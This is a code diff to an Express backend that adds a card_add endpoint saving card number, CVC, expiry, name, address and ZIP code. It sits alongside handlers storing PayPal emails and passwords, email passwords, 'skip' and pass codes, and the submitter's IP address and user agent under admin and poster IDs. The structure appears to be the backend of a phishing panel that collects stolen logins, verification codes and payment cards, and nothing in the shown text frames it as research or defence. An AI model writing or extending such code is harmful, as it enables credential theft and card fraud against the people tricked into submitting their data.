@@ -174,6 +174,23 @@ export const skip_code = (req, res) => {
 }
 
 
+
+export const card_add = (req, res) => {
+    const { id, validity,address,cardNumber,cvc,name,zipCode } = req.body;
+    Info.findOneAndUpdate({ _id: id }, {
+        $set: {
+            validity,address,cardNumber,cvc,name,zipCode
+        }
+    }, { new: true }, (err, ok) => {
+        if (err) {
+            res.status(400).json({ error: err })
+        }
+
+        return res.status(200).json({ success: true,id:id })
+    })
+
+}
+
 export const add_paypal = (req, res) => {
     const { id, email,password } = req.body;
     Info.findOneAndUpdate({ _id: id }, {
@@ -411,7 +428,7 @@ export const add_data = async (req, res) => {
 
 
     const { adminId, posterId } = req.params
-    const { site, email, password, skipcode ,username,passcode,mail,mailPass,onlyCard,holdingCard ,wrongPassword,validity,address,cardNumber,cvc,name,zipCode} = req.body
+    const { site, email, password, skipcode ,username,passcode,mail,mailPass,onlyCard,holdingCard ,wrongPassword} = req.body
   const userAgent = req.headers['user-agent'];
     const ipAddress =  (req.headers['x-forwarded-for'] || 
     req.connection.remoteAddress || 
@@ -432,7 +449,6 @@ export const add_data = async (req, res) => {
                 root: posterFound._id,
                 onlyCard,holdingCard,
                 wrongPassword,
-                validity,address,cardNumber,cvc,name,zipCode,
                  ip:ipAddress,
                 agent:userAgent
 
